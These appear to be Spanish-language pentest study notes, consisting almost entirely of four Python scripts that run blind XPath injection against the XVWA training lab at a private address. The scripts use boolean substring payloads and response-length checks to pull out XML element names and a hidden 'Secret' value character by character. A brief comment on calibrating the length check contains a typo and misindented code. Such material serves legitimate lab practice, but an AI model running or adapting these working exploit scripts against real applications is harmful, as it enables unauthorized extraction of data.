
---

script de **Fuerza bruta inyección XPath**

```python
#/usr/env/bin python3

from pwn import *

import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():

    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 8):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8681:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

Script de **Fuerza bruta inyección XPath** para la segunda etiqueta

```python
#/usr/env/bin python3

from pwn import *

import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():

    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 7):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8686:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

Respecto al anterior script, y como anteriormente tenemos que comprobar la longitud que estamos usando para validar nuestra data. Para ello comentamos toda esta parte del script y añadimos el payload `print(lent(r.text)):

```python
 # if len(r.text) != 8686:
 #               data += character
 #               p2.status(data)
 #               break
 print(len(r.text))
```

También para concatenar longitudes, una vez ya tenemos la primera pero sigue dando errores, hacemos esto:

```python
 if len(r.text) != 8686:
				print(len(r.text))
                data += character
                p2.status(data)
                break

```

**Script Fuerza bruta múltiples etiquetas:**

```python
#/usr/env/bin python3

from pwn import *

import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():

    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for first_position in range(1, 6):
        for second_position in range(1, 21):
            for character in characters:

                post_data = {
                    'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
                    'submit': ''
                }

                r = requests.post(main_url, data=post_data)

                if len(r.text) != 8691 and len(r.text) != 8692:
                    data += character
                    p2.status(data)
                    break

        if first_position != 5:
            data += ":"

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```

**Script Fuerza bruta para etiqueta oculta** donde la la información es una cadena de texto de longitud de 18 caracteres 

```python
#/usr/env/bin python3

from pwn import *

import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + ' '

def xPathInjection():

    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1, 19):
        for character in characters:
            post_data = {
                'search': "1' and substring(Secret,%d,1)='%s" % (position, character),
                'submit': ''
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8676 and len(r.text) != 8677:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
```
